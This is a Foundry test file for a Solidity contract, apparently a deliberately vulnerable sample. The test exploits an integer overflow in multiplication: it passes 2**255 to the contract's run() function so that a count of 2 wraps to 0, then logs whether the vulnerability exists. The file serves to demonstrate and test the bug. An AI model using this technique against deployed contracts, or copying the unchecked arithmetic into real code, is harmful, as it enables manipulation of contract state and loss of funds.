// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_mul.sol";

contract IntegerOverflowMulTest is Test {
    IntegerOverflowMul public integerOverflowMul;
    address public testCaller;

    event OperationPerformed(address indexed user, uint256 input, uint256 count);

    function setUp() public {
        // Deploy contract and set up initial state
        integerOverflowMul = new IntegerOverflowMul();
        testCaller = address(this);
        
        // Setup initial state - calls resetCount to initialize count
        integerOverflowMul.resetCount();
    }

    function testIntegerOverflow() public {
        // Set up initial state to 2 for overflow condition
        integerOverflowMul.run(2);

        console.log("--- BEFORE-Trigger Count ---");
        uint256 countBefore = integerOverflowMul.count();
        console.log("Current count: ", countBefore);
        
        // Prepare overflow input that will cause multiplication to wrap to 0
        uint256 overflowInput = 2**255;
        
        // Verify the overflow produces 0 in the event
        vm.expectEmit(address(integerOverflowMul));
        emit OperationPerformed(testCaller, overflowInput, 0);
        
        console.log("--- Trigger Attack: run(overflowInput) ---");
        
        // Perform overflow attack
        integerOverflowMul.run(overflowInput);

        console.log("--- AFTER-Trigger Count ---");
        uint256 countAfter = integerOverflowMul.count();
        console.log("Count after attack: ", countAfter);

        // Final vulnerability confirmation
        if (countAfter == 0) {
            console.log("Vulnerability Exists: Integer overflow successfully changed count from 2 to 0");
        } else {
            console.log("Vulnerability not Exist: Count remains %s, integer overflow failed", countAfter);
        }
    }
}